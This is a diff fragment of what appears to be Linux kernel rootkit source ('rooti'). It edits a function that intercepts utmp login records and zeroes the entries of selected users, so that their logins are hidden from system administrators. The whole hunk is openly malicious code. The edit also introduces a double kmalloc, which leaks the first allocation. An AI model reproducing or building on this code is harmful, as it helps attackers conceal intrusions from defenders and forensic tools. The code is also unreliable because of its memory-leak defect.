@@ -62,19 +62,22 @@ static bool rooti_should_hide_user(char *username)
 int rooti_hide_login_entry(char *user_buf, size_t count)
 {
     char *kernel_buf = kmalloc(count, GFP_KERNEL);
+    struct utmp *utmp_buf;
+    int err;
+
+    kernel_buf = kmalloc(count, GFP_KERNEL);
     if (kernel_buf == NULL) {
         ROOTI_DEBUG("failed to allocate memory");
         return -ENOMEM;
     }
+    utmp_buf = (struct utmp *)kernel_buf;
 
-    int err = copy_from_user(kernel_buf, user_buf, count);
+    err = copy_from_user(kernel_buf, user_buf, count);
     if (err > 0) {
         ROOTI_DEBUG("copy_from_user() failed: %d", err);
         kfree(kernel_buf);
         return -EFAULT;
     }
-
-    struct utmp *utmp_buf = (struct utmp *)kernel_buf;
 
     if (rooti_should_hide_user(utmp_buf->ut_user)) {
         // Filling the buffer with zeros should do the trick
